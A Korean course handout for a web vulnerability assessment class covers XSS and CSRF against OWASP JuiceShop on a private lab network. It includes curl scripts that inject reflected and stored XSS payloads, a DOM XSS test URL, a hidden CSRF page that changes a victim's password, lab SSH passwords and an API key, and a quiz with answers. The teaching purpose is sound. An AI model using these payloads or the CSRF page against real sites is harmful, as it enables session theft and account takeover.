# Week 06: 입력값 검증 (2): XSS / CSRF

## 학습 목표
- Cross-Site Scripting(XSS)의 세 가지 유형을 구분할 수 있다
- JuiceShop에서 Reflected, Stored, DOM XSS를 실습한다
- Cross-Site Request Forgery(CSRF)의 원리를 이해하고 점검한다
- CSRF 토큰의 유효성을 검증하는 방법을 익힌다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| opsclaw | 10.20.30.201 | Control Plane (OpsClaw) | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh:443, OpenCTI:9400) | `sshpass -p1 ssh siem@10.20.30.100` |
| dgx-spark | 192.168.0.105 | AI/GPU (Ollama:11434) | 원격 API만 |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + OpsClaw 연동 (Part 5) | 실습 |
| 3:20-3:40 | 복습 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

# Week 06: 입력값 검증 (2): XSS / CSRF

## 학습 목표
- Cross-Site Scripting(XSS)의 세 가지 유형을 구분할 수 있다
- JuiceShop에서 Reflected, Stored, DOM XSS를 실습한다
- Cross-Site Request Forgery(CSRF)의 원리를 이해하고 점검한다
- CSRF 토큰의 유효성을 검증하는 방법을 익힌다

## 전제 조건
- HTML/JavaScript 기초 (태그, 이벤트 핸들러)
- HTTP 요청/응답, 쿠키 개념 이해

---

## 1. XSS(Cross-Site Scripting) 개요 (20분)

### 1.1 XSS란?

XSS는 공격자가 웹 페이지에 악성 스크립트를 삽입하여, 다른 사용자의 브라우저에서 실행되게 하는 취약점이다.

```
공격자 → 악성 스크립트 삽입 → 서버에 저장 또는 URL에 포함
                                    ↓
피해자 → 해당 페이지 방문 → 스크립트 실행 → 쿠키 탈취, 피싱 등
```

### 1.2 XSS 유형 비교

| 유형 | 스크립트 위치 | 지속성 | 위험도 |
|------|-------------|--------|--------|
| **Reflected XSS** | URL 파라미터 → 응답에 반사 | 비지속 | 중간 |
| **Stored XSS** | DB에 저장 → 페이지에 출력 | 지속 | 높음 |
| **DOM XSS** | 클라이언트 JS에서 처리 | 비지속 | 중간 |

### 1.3 OWASP에서의 위치

**A03:2021 Injection** 카테고리. XSS는 가장 흔한 웹 취약점 중 하나로, 발견 빈도가 매우 높다.

---

## 2. Reflected XSS (30분)

> **이 실습을 왜 하는가?**
> "입력값 검증 (2): XSS / CSRF" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 원리

사용자의 입력이 서버 응답에 그대로 **반사(reflect)**되어 스크립트가 실행된다.

```
URL: http://site.com/search?q=<script>alert(1)</script>

서버 응답:
<p>검색 결과: <script>alert(1)</script></p>
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
              입력이 그대로 HTML에 삽입됨
```

### 2.2 JuiceShop에서 Reflected XSS 탐지

> **실습 목적**: XSS와 CSRF 취약점을 탐지하고 악용 시나리오를 증명한다
>
> **배우는 것**: Reflected/Stored XSS 페이로드 삽입과 CSRF 토큰 부재를 확인하는 점검 기법을 배운다
>
> **결과 해석**: 응답에 스크립트 태그가 그대로 포함되면 XSS 취약점이며, CSRF 토큰 없이 상태 변경이 가능하면 CSRF 취약점이다
>
> **실전 활용**: XSS는 쿠키 탈취와 세션 하이재킹에, CSRF는 비인가 거래 실행에 악용되는 고위험 취약점이다

```bash
# 검색 기능에 XSS 페이로드 삽입
# 서버 응답에 스크립트가 그대로 포함되는지 확인
curl -s "http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>" | grep -o "<script>alert(1)</script>" && echo "XSS 반사됨!" || echo "필터링됨"  # silent 모드 / 파일 저장

# URL 인코딩 버전
curl -s "http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" | head -5  # silent 모드

# 다양한 페이로드 테스트
PAYLOADS=(
  '<script>alert(1)</script>'
  '<img src=x onerror=alert(1)>'
  '<svg onload=alert(1)>'
  '"><script>alert(1)</script>'
  "'-alert(1)-'"
)

for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "[반사됨] $payload"
  else
    echo "[필터링] $payload"
  fi
done
```

### 2.3 JuiceShop의 트래킹 파라미터

```bash
# JuiceShop의 트래킹 기능에서 Reflected XSS
# /#/track-result?id= 파라미터 확인
curl -s "http://10.20.30.80:3000/#/track-result?id=<iframe%20src='javascript:alert(1)'>"

# Angular 기반이므로 서버 사이드 반사보다 클라이언트 사이드에서 처리될 수 있음
# 응답 HTML 소스를 확인하여 판단
curl -s http://10.20.30.80:3000 | grep -c "sanitize\|DomSanitizer\|innerHtml"
```

---

## 3. Stored XSS (30분)

### 3.1 원리

악성 스크립트가 서버(DB)에 **저장**되어, 해당 페이지를 방문하는 모든 사용자에게 실행된다.

```
1. 공격자 → 게시판에 <script>악성코드</script> 작성
2. 서버 → DB에 저장
3. 피해자 → 게시판 열람 → 스크립트 실행 → 쿠키 탈취
```

### 3.2 JuiceShop 피드백 기능에서 Stored XSS

```bash
# 먼저 로그인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

# 피드백에 XSS 페이로드 삽입
curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{                                                # 요청 데이터(body)
    "comment": "좋은 서비스입니다 <script>alert(document.cookie)</script>",
    "rating": 5,
    "captchaId": 0,
    "captcha": "-1"
  }' | python3 -m json.tool 2>/dev/null

# 저장된 피드백 조회 - XSS 페이로드가 그대로 나오는지 확인
curl -s http://10.20.30.80:3000/api/Feedbacks/ | python3 -c "  # silent 모드
import sys, json
data = json.load(sys.stdin).get('data', [])
for fb in data[-3:]:                                   # 반복문 시작
    comment = fb.get('comment', '')
    if '<script>' in comment or 'onerror' in comment:
        print(f'[XSS 발견] ID:{fb.get(\"id\")}, Comment: {comment[:100]}')
    else:
        print(f'[정상] ID:{fb.get(\"id\")}, Comment: {comment[:80]}')
" 2>/dev/null
```

### 3.3 다양한 저장 위치 테스트

```bash
# 사용자 프로필 이름에 XSS
curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{                                                # 요청 데이터(body)
    "email": "xss<img src=x onerror=alert(1)>@test.com",
    "password": "Test1234!",
    "passwordRepeat": "Test1234!",
    "securityQuestion": {"id": 1},
    "securityAnswer": "test"
  }' 2>/dev/null | python3 -m json.tool 2>/dev/null

# 상품 리뷰에 XSS
curl -s -X PUT http://10.20.30.80:3000/rest/products/1/reviews \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{                                                # 요청 데이터(body)
    "message": "훌륭한 제품! <img src=x onerror=alert(document.domain)>",
    "author": "student@test.com"
  }' 2>/dev/null

# 저장된 리뷰 확인
curl -s http://10.20.30.80:3000/rest/products/1/reviews | python3 -m json.tool 2>/dev/null | head -20  # silent 모드
```

---

## 4. DOM XSS (25분)

### 4.1 원리

서버를 거치지 않고, **클라이언트 JavaScript**가 URL 파라미터를 안전하지 않게 처리하여 발생한다.

```javascript
// 취약한 코드 예시
var name = document.location.hash.substring(1);
document.getElementById("welcome").innerHTML = "환영합니다, " + name;

// 공격 URL
http://site.com/page#<img src=x onerror=alert(1)>
```

### 4.2 JuiceShop에서 DOM XSS 탐지

```bash
# JuiceShop은 Angular SPA이므로 DOM XSS 가능성이 높음
# 메인 페이지의 JS 소스에서 위험한 패턴 검색

# innerHTML 사용 여부 확인
MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
if [ -n "$MAIN_JS" ]; then
  echo "JS 파일: $MAIN_JS"
  curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -c "innerHTML\|outerHTML\|document.write\|bypassSecurity\|trustAsHtml"
fi

# JuiceShop의 검색 기능은 클라이언트에서 결과를 렌더링
# DOM XSS 테스트: 검색어에 HTML 삽입
# 브라우저에서 http://10.20.30.80:3000/#/search?q=<iframe src="javascript:alert(1)"> 접근
echo "DOM XSS 테스트 URL:"
echo "http://10.20.30.80:3000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%60xss%60)%22%3E"
```

### 4.3 DOM XSS 소스와 싱크

| 소스 (Source) | 설명 |
|--------------|------|
| `document.URL` | 현재 URL |
| `document.location.hash` | URL의 # 이후 부분 |
| `document.referrer` | 이전 페이지 URL |
| `window.name` | 윈도우 이름 |

| 싱크 (Sink) | 설명 |
|-------------|------|
| `innerHTML` | HTML 삽입 |
| `document.write()` | 문서에 직접 쓰기 |
| `eval()` | 코드 실행 |
| `setTimeout(string)` | 문자열 코드 실행 |

---

## 5. CSRF(Cross-Site Request Forgery) (25분)

### 5.1 CSRF란?

CSRF는 인증된 사용자가 자신도 모르게 의도하지 않은 요청을 서버에 보내게 하는 공격이다.

```
1. 피해자 → JuiceShop에 로그인 (쿠키 발급)
2. 공격자 → 악성 페이지에 JuiceShop 요청을 숨김
3. 피해자 → 악성 페이지 방문 → 브라우저가 자동으로 요청 전송 (쿠키 포함)
4. JuiceShop → 정상 요청으로 인식 → 처리
```

### 5.2 CSRF 가능성 점검

```bash
# 1. CSRF 토큰 존재 여부 확인
# 폼 페이지에서 hidden 필드의 CSRF 토큰 확인
curl -s http://10.20.30.80:3000 | grep -i "csrf\|_token\|xsrf" | head -5

# 2. API 요청에 CSRF 방어 확인
# JuiceShop는 JWT 인증을 사용하므로 쿠키 기반 CSRF와 다름
# 하지만 쿠키로 세션을 관리하는 부분이 있는지 확인

# 로그인 후 쿠키 확인
curl -s -c - -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | grep -i "cookie\|set-cookie" || echo "쿠키 기반 세션 미사용"

# 3. SameSite 쿠키 속성 확인
curl -sI http://10.20.30.80:3000 | grep -i "set-cookie" | grep -i "samesite" || echo "SameSite 속성 미설정"
```

### 5.3 CSRF 공격 시나리오 (개념)

```html
<!-- 공격자가 만든 악성 페이지 -->
<html>
<body>
<h1>축하합니다! 상품권 당첨!</h1>
<!-- 숨겨진 요청: 피해자의 비밀번호를 변경 -->
<img src="http://10.20.30.80:3000/rest/user/change-password?new=hacked123&repeat=hacked123" style="display:none">

<!-- 또는 폼을 이용한 POST CSRF -->
<form action="http://10.20.30.80:3000/api/Feedbacks/" method="POST" id="csrf-form">
  <input type="hidden" name="comment" value="CSRF로 작성된 피드백">
  <input type="hidden" name="rating" value="1">
</form>
<script>document.getElementById('csrf-form').submit();</script>
</body>
</html>
```

### 5.4 CSRF 토큰 검증 점검

```bash
# CSRF 토큰 없이 상태 변경 요청이 성공하는지 확인
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

# 비밀번호 변경 시도 (CSRF 토큰 없이)
curl -s "http://10.20.30.80:3000/rest/user/change-password?current=Test1234!&new=NewPass123!&repeat=NewPass123!" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Cookie: token=$TOKEN" | python3 -m json.tool 2>/dev/null  # 쿠키 전송

# GET 메서드로 상태 변경이 가능하면 CSRF에 매우 취약
```

---

## 6. XSS 방어 방법 (10분)

### 6.1 방어 기법

| 기법 | 설명 | 적용 위치 |
|------|------|----------|
| **출력 인코딩** | `<` → `&lt;`, `>` → `&gt;` | 서버 템플릿 |
| **입력값 검증** | 화이트리스트 기반 필터링 | 서버 입력 처리 |
| **CSP 헤더** | 인라인 스크립트 차단 | HTTP 응답 헤더 |
| **HttpOnly 쿠키** | JS에서 쿠키 접근 불가 | Set-Cookie |
| **DOM Purify** | 클라이언트 HTML 정화 | JS 라이브러리 |

### 6.2 CSP 헤더 점검

```bash
# Content-Security-Policy 헤더 확인
curl -sI http://10.20.30.80:3000 | grep -i "content-security-policy"

# CSP가 없으면 인라인 스크립트 실행 가능 → XSS 위험 증가
# CSP가 있으면 정책 내용 분석:
# - 'unsafe-inline': 인라인 스크립트 허용 (위험)
# - 'unsafe-eval': eval() 허용 (위험)
# - 'self': 같은 출처만 허용 (양호)
```

---

## 7. 실습 과제

### 과제 1: XSS 탐지
1. JuiceShop의 검색, 피드백, 리뷰 기능에서 XSS를 시도하라
2. 성공한 페이로드와 차단된 페이로드를 표로 정리하라
3. 각 XSS 유형(Reflected/Stored/DOM)별로 1개 이상 성공 사례를 찾아라

### 과제 2: CSRF 점검
1. JuiceShop의 상태 변경 API(비밀번호 변경, 피드백 작성 등)를 나열하라
2. 각 API에 CSRF 방어(토큰, SameSite 등)가 있는지 확인하라
3. CSRF 공격이 가능한 시나리오를 1개 이상 작성하라

### 과제 3: 보안 헤더 분석
1. JuiceShop의 XSS 관련 보안 헤더를 모두 확인하라
   - Content-Security-Policy
   - X-XSS-Protection
   - X-Content-Type-Options
2. 각 헤더의 역할과 현재 설정의 적절성을 평가하라

---

## 8. 요약

| 취약점 | 공격 위치 | 영향 | 방어 |
|--------|----------|------|------|
| Reflected XSS | URL 파라미터 | 쿠키 탈취, 피싱 | 출력 인코딩, CSP |
| Stored XSS | DB 저장 데이터 | 모든 방문자 피해 | 입력 검증, 출력 인코딩 |
| DOM XSS | 클라이언트 JS | 쿠키 탈취, 피싱 | DOM Purify, CSP |
| CSRF | 외부 사이트 | 의도하지 않은 작업 | CSRF 토큰, SameSite |

**다음 주 예고**: Week 07 - 입력값 검증 (3): 파일 업로드, 경로 순회, OS 명령어 주입을 학습한다.

---

---

## 자가 점검 퀴즈 (5문항)

이번 주차의 핵심 기술 내용을 점검한다.

**Q1.** CVSS 9.8은 어떤 심각도 등급인가?
- (a) High  (b) **Critical**  (c) Medium  (d) Low

**Q2.** 취약점 점검 시 가장 먼저 수행하는 단계는?
- (a) 익스플로잇 실행  (b) **대상 범위 확인 및 정보 수집**  (c) 보고서 작성  (d) 패치 적용

**Q3.** SQLi 취약점의 CWE 번호는?
- (a) CWE-79  (b) **CWE-89**  (c) CWE-352  (d) CWE-22

**Q4.** 점검 보고서에서 취약점의 '재현 절차'가 중요한 이유는?
- (a) 분량을 늘리기 위해  (b) **고객이 직접 확인하고 수정할 수 있도록**  (c) 법적 요건  (d) 점검 시간 기록

**Q5.** WAF(:8082)가 SQLi를 차단할 때 반환하는 HTTP 코드는?
- (a) 200 OK  (b) **403 Forbidden**  (c) 500 Internal Error  (d) 301 Redirect

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b

---
---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성
